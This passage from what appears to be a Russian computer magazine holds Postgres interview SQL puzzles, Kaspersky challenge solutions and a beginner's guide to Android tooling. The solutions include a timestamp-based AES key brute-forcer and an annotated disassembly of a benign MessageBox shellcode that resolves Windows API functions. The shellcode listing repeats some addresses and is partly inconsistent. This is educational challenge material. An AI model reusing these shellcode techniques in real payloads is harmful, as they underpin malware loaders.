то», «Рамблер», «Манго Телеком», МИА «Россия сегодня», Skype, Instagram,
MasterCard, Huawei, Sony, Hitachi, TripAdvisor, Федеральная резервная систе-
ма США, Вооруженные силы США, государственные органы Франции, струк-
туры Европейского союза.


КАК ПРОХОДИТ СОБЕСЕДОВАНИЕ В КОМПАНИИ POSTGRES
PROFESSIONAL
У нас нет многоступенчатых собеседований, психологических тестирова-
ний, словом, мы не мучаем кандидатов формальностями, как это встречает-
ся в крупных компаниях. Когда человек, который хочет работать в Postgres
Professional, приходит на собеседование, с ним разговаривают сразу несколь-
ко сотрудников: начальник отдела, куда кандидат устраивается на работу,
HR-специалист, представитель высшего руководства, иногда — основатели
компании. Решение принимается после одного-двух собеседований, на них
обсуждаются различные профессиональные вопросы, в итоге становится
понятен и уровень квалификации соискателя, и подходим ли мы друг другу
для командной работы.
   Конечно, с кандидатами в разработчики мы не просто разговариваем,
а даем каждому решить одну-две задачи вроде тех, что предложены сегодня
в этой рубрике. И обязательно задаем вопросы практической направленно-
сти, предлагаем ответить на типичный клиентский запрос. Какими могут быть
эти практические задания? Например, компания оказывает услуги по техпод-
держке PostgreSQL и нашей собственной разработки — СУБД Postgres Pro.
Обычно для системам, которые создаются на базе свободного ПО, поддерж-
ка — вопрос проблемный. В России мы единственные, кто ее предостав-
ляет, и для нас это — дело большой важности. Для техподдержки в Postgres
Professional выделены специальные сотрудники, а остальные разработчики
могут подключаться, когда у клиентов возникают проблемы. Для каждого со-
искателя мы моделируем ситуацию вроде тех, которые встречаются у заказчи-
ков, и просим найти решение.

ЗАДАЧИ ОТ POSTGRES PROFESSIONAL
Задача 1
Есть таблицы пользователи usr(id  int,name  text) и друзья friend(usr_
id int, friend_usr_id int)) и посты (post(id int, usr_id int,
content text, added timestamptz). Напишите максимально эффективный
запрос, возвращающий десять последних постов друзей заданного пользо-
вателя (могут быть многочисленные друзья с большим количеством постов
в прошлом).

Задача 2
Можно ли в строке, состоящей из символов ( и ), проверить баланс скобок?
Как?

Задача 3
Есть большая таблица работников employee(id  int,  occupation  text,
sex text). Так получилось, что таблица состоит исключительно из бульдозе-
ристов-мужчин и нянечек-женщин. При эксплуатации выяснилось, что иногда
запрос

select 'found' where exists (
  select * from employee
  where occupation=$1 and sex=$2
)

работает очень медленно. Когда это происходит и как этого можно избежать?

Задача 4
Есть таблицы parent(id int) и child(id int, parent_id int references
parent(id)). Накладываются ли какие-либо блокировки на строки таблицы
parent при добавлении строк в таблицу child? Если да, то какие? Если нет, то
почему?

Задача 5
На каком уровне изоляции может выполняться запрос проверки бухгалтерско-
го баланса для получения непротиворечивого результата (предполагается,
что операции перевода средств работают корректно):

select sum(
  case when type='debet'  then  amount
       when type='credit' then -amount
  end
) from ledger


Задача 6
Почему данный запрос, обновляющий или добавляющий строки в случае их
отсутствия, некорректен?

with upd as(
  update tusr set name='name2' where id=1 returning 1
),
ins as(
  insert into tusr(id,name)
  select 1, 'name'
  where not exists(select * from upd)
  returning 2
)
select * from ins


Задача 7
Для обеспечения уникальности строк была создана следующая триггерная
функция:

create or replace function check_uniq() returns trigger as
$code$
begin
  if exists (select * from tbl t where t.col=new.col) then
    raise exception 'Unique violation';
  end if;
end;
$code$
language plpgsql

   Почему такой триггер некорректен? Как его сделать корректным?

Задача 8
Какое сообщение выведет этот блок кода?

do $code$
declare
  ctx text;
begin
  raise sqlstate 'ER001';
exception
  when sqlstate 'ER000' then
    raise notice 'ER000';
  when sqlstate 'ER001' then
    raise notice 'ER001';
end;
$code$


ПРИЗЫ ПОБЕДИТЕЛЯМ
Присылайте решения задач на адрес pr@postgrespro.ru!
   Оценивать работы и выбирать победителей будут наши специалисты во
главе с автором задач Иваном Фролковым, одним из ведущих экспертов
Postgres Professional. Победителям, приславшим большее число правильных
ответов, мы приготовили специальные призы — бесплатные билеты на все три
дня международного форума PgConf.Russia, который наша компания будет
проводить в марте 2017 года в Москве.


ПОБЕДИТЕЛИ ЗАДАЧ ОТ «ЛАБОРАТОРИИ КАСПЕРСКОГО»
(https://xakep.ru/2016/07/15/coding-challenges-210/)
Вот они, эти мощные парни. Прославим же их всем миром!
1. Octo Xor <oct0xor@gmail.com> — первое место. Эталонные решения!
   Эксперты ЛК в восторге.
2. Nikolenko Konstantin <knikolenko@yandex.ru> — молодец, все верно,
   но вторую задачу можно было бы расписать и подробнее.
3. sysenter <sysenter@inbox.ru> — заслуженное третье место.

А пока победители наслаждаются своей заслуженной славой, сувенирами
и программами от «Лаборатории Касперского», давай ознакомимся с пра-
вильными ответами!

Задание 1 (решение от Константина Николенко)
Ключ: rxrfrf54c5s3t6thbkfekd8b8i5iz2wj
Шифрограмма:

from Crypto.Cipher import AES
import sys
import time
import md5


 Quick and dirty solution

def DecryptFile(filename, password):
    inF = open(filename, 'r')
    inData = inF.read()
    inF.close()
    for timestamp in range(1467117929, 1497117929 ):
        PASSWORD_LEN = 32
        password = ''
        ts = timestamp
        alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
        for i in range(0, 32):
            password += alphabet[ts % len(alphabet)]
            ts = ( ( ts * 0xB11924E1 ) + 0x27100001 ) >> 8
        aes = AES.new(password, AES.MODE_ECB)
        outData = aes.decrypt(inData)
        pad = ord(outData[-1])
        padStart = len(outData) - pad
        good = 1
        if ( padStart <= 0 ) or ( pad < 16 ) :
            good = 0
        else:
            for i in range(padStart, padStart+pad):
                if ( ord(outData[i]) != pad ):
                    good = 0
                    break
        if good == 1:
            print 'Password: ' + password
    outData = outData[:-ord(outData[-1])]
    decryptedFileName = filename + '.dec'
    outF = open(decryptedFileName, 'w')
    outF.write(outData)
    outF.close()
    print 'Written ' + decryptedFileName
def EncryptFile(filename):
    PASSWORD_LEN = 32
    password = ''
    ts = int(time.time())
    alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
    for i in range(0, 32):
        password += alphabet[ts % len(alphabet)]
        ts = ( ( ts * 0xB11924E1 ) + 0x27100001 ) >> 8
    print 'Password: ' + password
    inF = open(filename, 'r')
    inData = inF.read()
    inF.close()
    length = 32 - (len(inData) % 16)
    inData += chr(length)*length
    aes = AES.new(password, AES.MODE_ECB)
    outData = aes.encrypt(inData)
    encryptedFileName = filename + '.enc'
    outF = open(encryptedFileName, 'w')
    outF.write(outData)
    outF.close()
    print 'Written ' + encryptedFileName
if ( len(sys.argv) <= 1 ):
    print 'Usage:\n -e encrypt_file_name\n -d decrypt_file_name
        password\n'
    exit(0)
if ( sys.argv[1] == '-d' ) :
    if ( len(sys.argv) < 4 ) :
        print 'Need filename and password\n'
        exit(1)
    DecryptFile(sys.argv[2], sys.argv[3])
if ( sys.argv[1] == '-e' ) :
    if ( len(sys.argv) < 3 ) :
        print 'Need filename\n'
        exit(1)
    EncryptFile(sys.argv[2])


Задача 2 (решение от Octo Xor)
0x78 байт в шапке, значит, шелл-код сжат злибом. Качаем offzip с сайта авто-
ра, делаем:

offzip -z 0 backup_001337.BIN uncompresed 0x200

Загружаем бинарник в IDA Pro/Starter/Demo и видим:

seg000:00000021  loc_21:
seg000:00000021  mov  esi, [edx+28h] // Ищем модуль kernel32
seg000:00000024  mov  eax
seg000:00000055  cmp  dword ptr [eax], 905A4Dh // Проверяем хидер
seg000:00000087  mov  [ebp+var_4], eax
seg000:0000008A  mov  [ebp+var_8], 7373h
seg000:00000091  mov  [ebp+var_C], 65726464h
seg000:00000098  mov  [ebp+var_10], 41636F72h
seg000:0000009F  mov  [ebp+var_14], 50746547h
seg000:000000A6  lea  esi, [ebp+var_14]
seg000:000000A9  push esi
seg000:000000AA  push eax
seg000:000000AB  call sub_10B // Получаем адрес GetProcAddress
seg000:00000087  mov  [ebp+var_4], eax
seg000:0000008A  mov  [ebp+var_8], 7373h
seg000:00000091  mov  [ebp+var_C], 65726464h
seg000:00000098  mov  [ebp+var_10], 41636F72h
seg000:0000009F  mov  [ebp+var_14], 50746547h
seg000:000000A6  lea  esi, [ebp+var_14]
seg000:000000A9  push esi
seg000:000000AA  push eax
seg000:000000AB  call sub_10B // Получаем адрес LoadLibraryA
seg000:000001E5  mov  dword ptr [ecx+8], 72657375h
seg000:000001EC  mov  dword ptr [ecx+0Ch], 3233h
seg000:000001F3  push ecx
seg000:000001F4  push ecx
seg000:000001F5  add  [esp+48h+var_48], 8
seg000:000001F9  mov  esi, ecx
seg000:000001FB  call dword ptr [ecx+4] // Грузим модуль user32
seg000:00000207  mov  edi, eax
seg000:00000209  lea  esi, [esi-0Ch] // MessageBoxA
seg000:0000020C  push esi
seg000:0000020D  push edi
seg000:0000020E  call dword ptr [ecx] // GetProcAddress
seg000:0000022D  loc_22D: ; CODE XREF: sub_177+BB j
seg000:0000022D  xor  byte ptr [edx], 31h
seg000:00000230  inc  edx
seg000:00000231  dec  ecx
seg000:00000232  jnz  short loc_22D // Анксорим «Hello good people!»
seg000:00000234  pop  edx
seg000:00000235  pop  ecx
seg000:00000236  push 0
seg000:00000238  push 0
seg000:0000023A  push edx
seg000:0000023B  push 0
seg000:0000023D  call eax // Выводим на экран при помощи MessageBoxA

Для тех, кто не любит читать даже откомментированный код :), Константин Ни-
коленко суммирует: «Получаем шелл-код, выводящий MessageBox с текстом
Hello good people!. В шелл-коде перед вызовом MessageBox имеется INT 3
без обработчика SEH/VEH».

IT-КОМПАНИИ, ШЛИТЕ НАМ СВОИ ЗАДАЧКИ!
Миссия этой мини-рубрики — образовательная, поэтому мы бесплатно публи-
куем качественные задачки, которые различные компании предлагают соиска-
телям. Вы шлете задачки на lozovsky@glc.ru (lozovsky@glc.ru) — мы их публику-
ем. Никаких актов, договоров, экспертиз и отчетностей. Читателям — задачки,
решателям — подарки, вам — респект от нашей многосоттысячной аудито-
рии, пиарщикам — строчки отчетности по публикациям в топовом компьютер-
ном журнале.
    КОДИНГ





             Евгений Зобнин
                zobnin@gmail.com
 ANDROID:
  10 ТРАБЛОВ
 НАЧИНАЮЩЕГО
  РАЗРАБОТЧИКА
   РЕШАЕМ ПРОБЛЕМЫ
    БЕЗ ЕДИНОЙ СТРОЧКИ КОДА





     Начиная осваивать разработку для любой платформы, ты
     обязательно сразу же наткнешься на множество с перво-
     го взгляда незаметных подводных камней. Большинство
     из них будут связаны с самим процессом кодинга: несо-
     стыковки в API, скрытые функции, ограничения, особый
     стиль программирования для платформы. Есть и камни,
    лежащие немного поодаль: тестирование и автоматиче-
     ская оптимизация, создание клипарта и иконок, получе-
     ние автоматических краш-репортов. Неопытные разра-
     ботчики для Android рискуют отбить о них обе ноги.

     В этой статье мы рассмотрим проблемы разработки для Android в контексте
       утилит и инструментов. Мы избавимся от необходимости подключать смарт-
     фон с помощью кабеля во время тестирования и отладки на устройстве, рас-
     щепим приложение на версии Lite и Pro, встроим в него механизм автома-
      тической генерации и отсылки на сервер краш-репортов, автоматизируем
       тестирование, обфусцируем и оптимизируем код, а также за несколько минут
      создадим для приложения иконку и все необходимые ресурсы. Поехали.

    МЕДЛЕННЫЙ ЭМУЛЯТОР
       Итак, ты набросал свое первое приложение, и пора его запустить и проверить
      на работоспособность. Для этого в комплекте Android SDK есть эмулятор. Дол-1гое время его упрекали за медлительность, но с выпуском Android Studio 2.0
      ситуация намного улучшилась — x86-версия эмулятора получила хардварное
       ускорение, так что теперь он работает быстрее реальных устройств. К тому же
       у него появился удобный графический интерфейс, с помощью которого можно
      симулировать звонки, СМС, изменять данные GPS и сбои в сети, то есть все,
      для чего раньше приходилось использовать инструменты командной строки.
         Поэтому, если ты еще не обновился, настоятельно рекомендую это сделать,
      не говоря уже о переходе с Eclipse. И обязательно выбирать x86-версию эму-
      лятора в AVD manager, ARM-версия не поддерживает хардварное ускорение.





                                                Новый эмулятор Android Studio 2.0





    СМАРТФОН НА ПОВОДКЕ
      Второй этап — тестирование на реальном устройстве. Здесь все просто: под-
      ключаешь смартфон по USB, устанавливаешь драйверы, включаешь режим от-2 ладки в настройках для разработчиков, после чего девайс появляется в списке
      доступных для установки приложения (рядом с эмулятором). Проблема толь-
       ко в том, что в данном случае устройство необходимо держать подключенным
        к ПК с помощью кабеля, а если это твой основной смартфон, на который по-
      ступают звонки и сообщения, то об удобстве говорить не приходится.
        К счастью, Android Studio (а точнее, утилита ADB, которую он использует
      для связи с устройством) поддерживает работу по сети. Но данную функцию
     еще нужно активировать. Если у тебя рутованный смартфон, то тебе повезло:
      включить отладку по сети можно с помощью приложения WiFi ADB. Последо-
       вательность действий:
        1. Устанавливаем WiFi ADB, запускаем, включаем сетевой режим с помощью
         переключателя и запоминаем IP-адрес.
        2. Запускаем Android Studio.
        3. Открываем консоль, переходим в каталог с установленным SDK, далее
         в platform-tools и запускаем следующую команду:

      $ adb connect IP-адрес

       Теперь, если попытаться собрать и запустить приложение, ты увидишь в спи-
       ске устройств также и свой смартфон. Те, у кого нет root, могут перезапустить
     ADB в сетевом режиме, предварительно подключив его кабелем. Делается
       это так:
        1. Подключаем смартфон и устанавливаем драйверы.
        2. Включаем режим отладки в настройках для разработчиков.
        3. Открываем консоль, переходим в каталог SDK/platform-tools и запускаем
        следующую команду:

      $ adb tcpip 5555

        4. Подключаемся к смартфону по сети:

      $ adb connect IP-адрес

       IP-адрес можно узнать через настройки: «О телефоне (О планшете)  Общие
       сведения», пункт «IP-адрес».

    БИБЛИОТЕКИ
      Окей, твой накиданный за полчаса огрызок вроде бы работает, и настало вре-
      мя превратить его в настоящее приложение с красивым интерфейсом и вид-3 жетами для рабочего стола. На этом этапе тебе наверняка понадобятся внеш-
      ние библиотеки, реализующие различные концепции интерфейса, паттерны
      программирования и связь с внешними сервисами. И если с последними все
      ясно (нужен SDK для Dropbox — открываешь портал для разработчиков и сле-
      дуешь инструкциям), то с остальными уже сложнее. Где их искать и какие би-
      блиотеки лучше?
        Наиболее полный каталог библиотек — это Android Arsenal. Там ты най-
      дешь практически все, что тебе нужно. Доступны удобный поиск и сортировка
      по рейтингу, для каждой библиотеки есть инструкция, как ее подключить к сво-
      ему проекту, в том числе с помощью стандартной для Android системы сбор-
       ки Gradle: достаточно добавить репозиторий в файл build.gradle проекта и ука-
       зать библиотеку в списке зависимостей.





                              Для каждой библиотеки есть инструкция по подключению


      Отличный список must have библиотек ты найдешь на этой странице. От себя
      добавлю, что на первых этапах стоит сразу изучить Dagger 2, RxJava и Retrofit.
      Став продвинутым разработчиком, ты так или иначе придешь к использованию
       этих библиотек.

    ИКОНКИ И КЛИПАРТ
      Наконец, спустя дни или недели у тебя начинает вырисовываться полноцен-
      ное приложение. Вот только никакого графического материала нет до сих пор:4 иконка стандартная, в форме зеленого робота, вместо клипарта — заглушки.
      Очевидно, без графики соваться в маркеты бессмысленно, однако и платить
       за иконку для своего первого приложения тоже глупо. Что делать?
        На самом деле иконку можно сгенерировать. Есть замечательный веб-сер-
      вис Android Asset Studio, с помощью которого буквально за пару минут ты по-
      лучишь красивую иконку во всех возможных разрешениях. В качестве осно-
      вы можно взять подготовленную тобой картинку, просто написать текст или,
       что лучше всего, выбрать из предоставленного сервисом клипарта. Также ты
     сможешь задать стиль иконки (круглая, квадратная, в стиле iOS...), цвет, на-
       строить тени и другие параметры. В результате в твоем распоряжении по-
       явится архив ic_launcher.zip, который необходимо развернуть в каталог
      AndroidstudioProjects/ИМЯ_ПРИЛОЖЕНИЯ/app/src/main/res. Обязательно
      создай веб-иконку, нажав на кнопку Generate web icon. Она тебе понадобится.





                                                       Не забудь про веб-иконку


       Тот же сервис позволяет создать иконки для ActionBar’а и строки состояния.
      Принцип примерно тот же, скажу лишь, что в строке состояния лучше всего
      смотрятся иконки с отступом от краев 15%.
        Кроме того, тебе понадобится так называемая Feature Image. Это специ-
      альная картинка, которую Play Market и другие магазины приложений исполь-
      зуют в качестве плашки в верхней части экрана (когда открываешь страницу
      приложения на смартфоне). Ее можно сгенерировать с помощью другого сер-
       виса. Для оформления скриншотов можно использовать официальный сервис
       от Google. Он создает вокруг скриншота рамку смартфона.

    КРАШ-РЕПОРТЫ
      Приложение готово, иконка есть, интерфейс удобный, код качественный. Наста-
      ло время тестирования, и первое, что ты делаешь, — рассылаешь приложение5 друзьям и знакомым. Но вот незадача: у некоторых из них приложение падает,
      а у тебя все работает отлично, и повторить действия, приведшие к падению, ты
      не можешь. Что делать, просить друзей присылать тебе листинг logcat?
          Нет, нам нужна система краш-репортинга. Таких существует огромное мно-
       жество, и все они реализуют один и тот же принцип работы: к приложению
      подключается небольшая библиотека, которая в момент падения записывает
       стектрейс и другие данные о падении и отправляет их на сервер, а затем специ-
      альный веб-интерфейс формирует на их основе красивые и наглядные отчеты.
        Одна из самых популярных таких систем — Fabric, однако я рекомендую по-
      смотреть в сторону Splunk MINT: он бесплатный, простой и легко интегрирует-
      ся в приложение (достаточно добавить всего одну строку кода). Чтобы начать
     им пользоваться, необходимо подключить к проекту SDK, сделать это можно
      с помощью все того же Gradle. Открываем файл build.gradle (тот, что относится
        к приложению, а не ко всему проекту) и добавляем следующие строки:

      repositories {
          maven { url "https://mint.splunk.com/gradle/" }
      }
      dependencies {
          compile "com.splunk.mint:mint:5.0.0"
      }

      Далее открываем веб-страницу Splunk MINT, регистрируемся и добавляем но-
      вое приложение через панель управления (add app):





      После этого Splunk MINT покажет тебе строку кода, которую необходимо вста-
       вить в код:





      Лучшее место для этой строки — основная активность твоего приложения (по
      умолчанию носит имя MainActivity.java), самое начало метода onCreate(). Од-
      нако если ты пишешь сервисное приложение, которое может работать без ин-
      терфейса и запускаться во время загрузки или по расписанию, то строку сле-
       дует вставлять в код сервиса, тоже в начало onCreate().
        После сборки приложения и установки на устройство Splunk MINT начнет
       работать. Ты получишь доступ к статистике (количество установок, юзеров, па-
       дений, версии Android, использование сети и прочее):





      Ну и конечно же, статистика падений и стектрейсы:





      Этой информации вполне достаточно для решения проблемы.

    ТЕСТИРОВАНИЕ
      Отлично, приложение прошло через твоих друзей, и оно им понравилось. Что
      дальше? Выкладывать в маркет? Нет, теперь нужно пропустить его через си-6 стему автоматического тестирования и профессиональных человекообразных
       тестеров.
         Наверное, лучший сервис автоматического тестирования — это Xamarin.
     Он позволяет запустить приложение на двух тысячах виртуальных устройств,
      выполнять операции взаимодействия с пользователем (тапы, жесты, смахива-
       ния, нажатия физических кнопок), изменять положение смартфона, включать
      камеру и многое другое. В ответ на каждое действие ты получаешь скриншот,
      а также статистику потребления памяти, процессора и прочего.
        Проблема Xamarin только в том, что тесты придется писать самому, ис-
       пользуя фреймворк Calabash, то есть, по сути, писать еще одно приложение
       (на Ruby или C#) для тестирования первого. Сам сервис, конечно же, платный.
      Триальный период составляет 30 дней, после чего придется платить от 100
      долларов в месяц. С другой стороны, сам Calabash — это open source проект,
       так что все можно настроить и на локальной машине.
       С тестированием реальными людьми все несколько проще. Достаточно
      иметь готовое приложение и описание на обычном человеческом языке, что
      конкретно ты хочешь от тестировщика. Далее подбираем подходящий сервис,
      загружаем приложение, требования и ждем. Какой сервис выбрать? Их мно-
        го, но лучше остановиться на Ubertesters. У них весьма демократичные цены,
      плюс в нагрузку ты получаешь аналог Splunk MINT абсолютно бесплатно. Один
       час тестирования стоит от 25 долларов.





                                                  Создаем новый проект на Ubertesters


    ОБФУСКАЦИЯ И ОПТИМИЗАЦИЯ
      Окей, приложение протестировано со всех сторон, и пора его выложить в мар-
        кет. Но сперва нужно позаботиться о том, чтобы никто не смог украсть твою7 суперидею, — все-таки байт-код Dalvik весьма прост, и его не только легко чи-
       тать после дизассемблирования, но и в большинстве случаев реально перег-
       нать во вполне рабочий исходный код Java. Причем сделать это можно с по-
     мощью самого Android Studio без всяких сторонних инструментов.
        К счастью для нас, большинство реверсеров мобильных приложений —
       слабаки, неспособные расковырять код после применения простейшего об-
       фускатора. И такой обфускатор есть в составе Android Studio. Он носит имя
      ProGuard и включается простой директивой minifyEnabled true в файле build.
       gradle приложения:

      buildTypes {
          release {
              debuggable false
              minifyEnabled true
              proguardFiles getDefaultProguardFile(
                  'proguard-android-optimize.txt'), 'proguard-rules.pro'
          }
      }

      Принцип работы ProGuard довольно прост: он переименовывает имена всех
       классов, методов и полей (MainActivity.class становится A.class, onCreate()
      превращается в b() и так далее), а также удаляет всю отладочную информа-
      цию, неиспользуемый код и неиспользуемые параметры функций, выполняет
      инлайнинг методов (если метод-1 состоит из нескольких строк, метод-2 вызы-
       вает его множество раз, разумнее перенести код метода-1 в метод-2). При-
      ложение становится компактнее, быстрее, а ориентироваться по нему после
      декомпиляции сложнее.
        Для последующей оптимизации кода можно применить ReDex от Facebook.
      Как и ProGuard, он выполняет инлайнинг, удаляет мертвый код, а кроме того,
      делает так называемую feedback-directed optimization (FDO), которая позволя-
       ет разместить код, используемый при первом старте приложения, ближе к на-
       чалу бинарника. Из других возможностей: удаление интерфейсов, которые
      реализуются только одним классом, и метаданных, включенных в байт-код (на-
      пример, аннотации, необходимые исключительно на этапе сборки, и ссылки
      на файлы исходных текстов).
        По словам разработчиков, ReDex не призван заменить ProGuard, а должен
       запускаться уже после него. В результате скорость старта и размер комплекс-
      ного приложения удастся улучшить примерно на 25% (это информация разра-
       ботчиков). Единственная проблема инструмента в том, что он доступен только
      для macOS и Linux. Причем в форме готовых пакетов его нет, придется соби-
       рать самостоятельно. В Linux этот процесс выглядит так:

      $ git clone https://github.com/facebook/redex.git
      $ cd redex
      $ autoreconf -ivf && ./configure && make
      $ sudo make install

      Далее следует натравить его на пакет с приложением:

      $ export ANDROID_SDK=/путь/до/SDK
      $ redex --sign -s /путь/до/хранилища/ключей -a имя_ключа
          -s пароль app-release.apk -o app-release-optimzied.apk

      Хранилище ключей, ключ и пароль ты должен знать, так
       как эта информация необходима для сборки релизной
      версии твоего приложения.
        При необходимости можно применить тяжелую ар-
      тиллерию, а именно — платные обфускаторы вроде
                                                              INFO       AppSolid и DexProtector. Они позволяют не просто об-
      фусцировать байт-код приложения, но и зашифровать                                                                                Чтобы удалить
       строки, классы, код нативных библиотек, ресурсы и за-    неиспользуемые ресурсы,
      щитить приложение от модификации и перепаковки.        следует добавить
                                                                                     в блок buildTypes
      Стоят они дорого, и к тому же их защита тоже может                                                                                               release директиву
      быть нейтрализована, причем совсем нехитрым спо-       shrinkResources true.
      собом.

      LITE- И PRO-ВЕРСИИ
      Ну все, пора выкладывать в Play Market. Хотя нет, стоп! Ты же не просто так си-
      дел и писал ночами код, а потом, зевая, шел на учебу. Не зря перерыл кучу до-8 кументации и терзал людей глупыми вопросами на Stack Overflow. Ты хочешь
       заработать, а в идеале не просто заработать, а разбогатеть! Поэтому у тебя
       есть четыре варианта дальнейших действий.
        1. Ты выкладываешь приложение в Play Market и назначаешь за него цену. Не-
          достаток: людей придется каким-то образом убеждать, почему они должны
          установить твое приложение. Для начинающего разработчика это не вари-
           ант.
        2. Ты добавляешь в приложение рекламу. Недостаток: на рекламе ты зарабо-
         таешь максимум на пиво, к тому же она сильно раздражает людей.
        3. Ты реализуешь систему in-app purchaise, то есть даешь возможность раз-
         блокировать дополнительные функции, заплатив прямо из приложения. Не-
          достаток: in-app purchaise полностью завязан на Google Play Services, а зна-
           чит, либо недоступен в других маркетах, либо реализуется там по-другому.
         Придется делать разные версии.
        4. Ты разбиваешь приложение на версии Lite и Pro, сохраняя таким образом
         возможность без модификаций выкладывать приложение в различные мар-
          кеты, в том числе китайские — их пользователи обычно не имеют доступа
           к сервисам Google. Недостаток: Pro-версию очень легко стащить.

      Итого два приемлемых варианта: 3 и 4. Но так как третий вариант выходит да-
      леко за рамки данной статьи (придется добавлять в приложение код и пере-
       страивать его структуру, подробнее в официальной документации), то мы по-
      говорим только о четвертом.
        Для реализации этой идеи в системе сборки Gradle есть функция Flavors.
     Она позволяет собрать несколько вариантов приложения из одного проекта.
       Все, что требуется сделать, — это добавить в build.gradle приложения следую-
     щие строки:

      productFlavors {
          lite {
              packageName = 'com.example.app'
          }
          pro {
              packageName = 'com.example.app.pro'
          }
      }

      После этого ты получишь доступ к переменной BuildConfig.FLAVOR. Проверяя
      ее значение, можно изменять поведение приложения в зависимости от его ва-
       рианта:

      if (BuildConfig.FLAVOR.equals("pro") {
          // Премиум-код
      } else {
          // Код для бедных
      }

      Однако у этого подхода есть изъ-
      ян — оба варианта приложения бу-
       дут включать в себя весь код, так что
      превратить Lite-версию в Pro мож-
      но будет правкой одной строки в ди-
      зассемблированном  коде. Гораздо
      лучше полностью разделить исход-
       ники, отличающиеся в разных  ва-
       риантах приложения. Для этого до-
       статочно рядом с каталогом main
       внутри app/src проекта создать два
       каталога с именами вариантов (Lite
      и Pro), а в них подкаталоги java/com/
       example/app, где разместить исход-
       ники, различающиеся для каждого
       варианта. К примеру, в случае с клас-
      сом Premium структура каталога бу-
       дет выглядеть так (рисунок справа).

    ТОНКОСТИ GOOGLE PLAY
      Разработка завершена, поздравляю! Но на этом твоя эпопея еще не законче-
       на, Google Play не так прост, как кажется. Во-первых, тебе нужны 25 долларов.9 Без них в маркет не пустят. Во-вторых, сразу после создания нового приложе-
      ния в Developers Console необходимо сменить язык по умолчанию на англий-
      ский (Переводы   Сменить язык по умолчанию):





      Иначе все, у кого смартфон настроен на использование отличного от русского
       языка, все равно будут видеть описание на русском. Конечно же, само описа-
      ние тоже нужно заранее подготовить на обоих языках (если не знаешь англий-
      ский — попроси друга), так же как и скриншоты. Это просто, достаточно сде-
       лать скриншоты, затем переключить язык в настройках смартфона и повторить
       действия.
         Также от тебя потребуют значок в высоком разрешении и значок для раз-
      дела «Рекомендуемые». Если ты следовал инструкциям из статьи, они у тебя
      уже должны быть — это те самые веб-иконка и Feature Image.
        Ну а далее все просто: тип приложения, категория, возрастная группа, веб-
       сайт, email. Когда ты заполнишь все поля и получишь сертификат IARC на пу-
      бликацию приложений для указанной возрастной группы (он моментально
      приходит на email), останется только нажать кнопку «Опубликовать приложе-
      ние» вверху страницы и ждать. Обычно первая публикация занимает в среднем
      час или два. Обновление — около тридцати минут, причем вне зависимости
       от того, обновил ли ты само приложение или исправил опечатку в описании.

    АЛЬТЕРНАТИВНЫЕ МАРКЕТЫ
      Тебя может это удивить, но уже через неделю после публикации в Play Market
      твое приложение начнет всплывать и во многих альтернативных маркетах, та-1 ких как AppsZoom и 1Mobile. Это хороший знак, и вместо того, чтобы беспоко-
       иться, лучше самому предпринять дальнейшие шаги для размещения своего
      приложения в маркетах.0





                                     Приложение Overscan появилось на AppZoom менее
                                      чем через неделю после публикации в Play Market


      Чтобы тебе не пришлось долго искать, вот список наиболее перспективных:
       •  Amazon App Store — известный маркет от Amazon, предустанавливаемый
         на планшеты Kindle.
       •  GetJar — один из крупнейших альтернативных маркетов мобильных прило-
         жений. Согласно информации на начало 2015 года, содержит 849 036 при-
         ложений Java ME, BlackBerry, Symbian, Windows Mobile и Android.
       •  SlideMe — известный маркет, который китайцы часто предустанавливают
         на свои устройства вместо Google Play.
       •  Xiaomi App Store — официальный маркет китайского «производителя всего
         и вся» — Xiaomi.
       •  Baidu App Store — один из крупнейших китайских магазинов приложений.
       •  Samsung Galaxy Apps — официальный магазин приложений Samsung. Отли-
          чается очень дотошной проверкой публикуемых приложений.
       •  XDA Labs — магазин приложений форума XDA Developers. Хорошо подходит
         для публикации системных приложений и твиков, приложений, требующих
            root, и модулей Xposed.

      Ну и не стоит забывать про форум 4pda.ru. Там всегда можно получить хоро-
     ший фидбэк от юзеров.

    ВЫВОДЫ
      Создание приложения для Android с нуля — это не только кодинг. Тебе при-
      дется решить и множество других вопросов, из которых часть может потребо-
       вать денежных вливаний. Но, как мы выяснили, платить совсем не обязательно
      и при разработке инди-приложений вполне можно обойтись бесплатными ин-
      струментами.
КОДИНГ
VK.COM — ТВОЙ
БЕСПЛАТНЫЙ БЭКЕНД
ПИШЕМ СВОЙ КЛИЕНТ ДЛЯ СТЕНЫ ГРУППЫ VK.COM





В прошлой статье мы рассмотрели несколь-
ко интересных способов использования
бездонных хранилищ наследия Павла Дуро-
ва. В сегодняшнем материале я предложу                                                                        Владимир Петрович
тебе развить эту тему и поделюсь навыками            rusdelphi.comТимофеев
разработки клиента для нашей любимой со-
циальной сети.

ОПЯТЬ ТЕОРИЯ
Для получения записей со стены используется метод wall.get.
  Он вернет нам массив записей (JSON), начиная с последней (если нам
нужно получать записи с начала списка, то придется использовать в запросе
параметр offset), а в поле соunt попадет число всех записей.
   Стоит отметить, что пока этот метод построен не очень гибко. Придется де-
лать два запроса к API вместо одного, первый раз — чтобы получить количе-
ство записей (count), а второй раз — уже нужные записи, используя первое
значение как смещение. Записи в массиве будут располагаться в порядке
от ранних к поздним.
   У каждого элемента массива записей со стены может быть до десяти при-
ложений (документы, музыка, видео, фото). Вот пример ответа:





Поле type указывает на тип вложения, каждый из них нужно обрабатывать
по-своему. Для новостного приложения обычно достаточно текста и картинок.
Текст мы получим из поля text, а описание картинки нужно брать из аттача
с типом photo, который обладает такими характеристиками, как ширина, вы-
сота, ссылки на картинку в разных размерах и собственно описание.
   Для обработки видео нам нужно получить его id и сделать дополнитель-
ный запрос к методу video.get с параметром videos. Значение для этого па-
раметра должно состоять из owner_id + id (-50536551_171623222). Если
владелец видео — группа, то owner_id берется со знаком -. В ответ придет
описание видеообъекта.





В поле files лягут прямые ссылки на видео в разном разрешении или ссылка
на внешний источник. В нашем примере это YouTube.
   Приложение с типом audio (как и doc) обладает еще и полем url со ссылкой
на файл — MP3 или текстовый соответственно.
   Для клиентского приложения важно получить данные из сети, сохранить их
и отобразить пользователю. Способов работы с сетью предостаточно — это
могут быть стандартные инструменты или сторонние библиотеки. Для работы
с интернетом в SDK есть стандартный класс URLConnection. Ответ нужно раз-
бирать вручную и как-то обрабатывать. Обычно для ответов собирают массив
классов, где классы описывают объекты из API.
   Сегодня для работы с сетью многие предпочитают использовать сторон-
ние инструменты. Часто это вызвано необходимостью обеспечивать адек-
ватную работоспособность при плохой связи (да-да, во многих местах нашей
